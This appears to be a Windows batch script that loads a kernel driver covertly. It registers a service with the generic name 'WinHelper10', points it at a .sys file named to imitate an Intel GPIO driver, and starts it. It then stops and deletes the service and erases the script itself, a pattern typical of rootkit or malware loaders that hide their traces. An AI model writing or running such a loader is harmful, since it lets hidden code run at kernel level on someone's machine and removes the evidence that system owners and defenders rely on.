@echo off
cd %~dp0
sc create WinHelper10 binpath=C:\Windows\System32\drivers\iaLPSS1i_GPIO2_BXT_P.sys type=kernel
sc start WinHelper10
sc stop WinHelper10
sc delete WinHelper10
del "%~f0"